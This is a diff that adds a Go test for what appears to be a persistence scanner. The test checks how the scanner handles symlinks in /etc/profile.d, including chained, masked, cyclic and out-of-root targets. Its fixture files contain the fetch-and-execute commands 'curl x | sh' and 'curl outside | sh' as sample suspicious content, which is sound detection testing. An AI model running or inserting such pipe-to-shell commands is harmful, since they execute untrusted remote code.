@@ -147,3 +147,43 @@ func TestPAMMissingOptionalVersusUnownedLibrary(t *testing.T) {
 		}
 	}
 }
+
+func TestPersistenceSystemSymlinksStayInsideHostRoot(t *testing.T) {
+	root := t.TempDir()
+	outside := t.TempDir()
+	persistenceWrite(t, root, "usr/share/profile", "curl x | sh\n")
+	persistenceWrite(t, outside, "outside", "curl outside | sh\n")
+	os.MkdirAll(filepath.Join(root, "etc/profile.d"), 0755)
+	for name, target := range map[string]string{"absolute": "/usr/share/profile", "chain": "absolute", "masked": "/dev/null", "cycle": "cycle", "outside": filepath.Join(outside, "outside")} {
+		if err := os.Symlink(target, filepath.Join(root, "etc/profile.d", name)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	got := SystemChecks(root, time.Now(), DefaultConfig())
+	hits := map[string]bool{}
+	issues := ""
+	for _, f := range got {
+		if f.ID == "autostart_suspicious" {
+			hits[f.Path] = true
+		}
+		if f.ID == "persistence_unavailable" {
+			for _, e := range f.Evidence {
+				issues += e.String() + "\n"
+			}
+		}
+	}
+	for _, p := range []string{"absolute", "chain"} {
+		if !hits["/etc/profile.d/"+p] {
+			t.Errorf("system symlink not inspected: %s", p)
+		}
+	}
+	if hits["/etc/profile.d/outside"] {
+		t.Fatal("escaped host root")
+	}
+	if strings.Contains(issues, "/masked") {
+		t.Fatal("masked file marked incomplete")
+	}
+	if !strings.Contains(issues, "/cycle") || !strings.Contains(issues, "/outside") {
+		t.Fatalf("missing incomplete paths: %s", issues)
+	}
+}
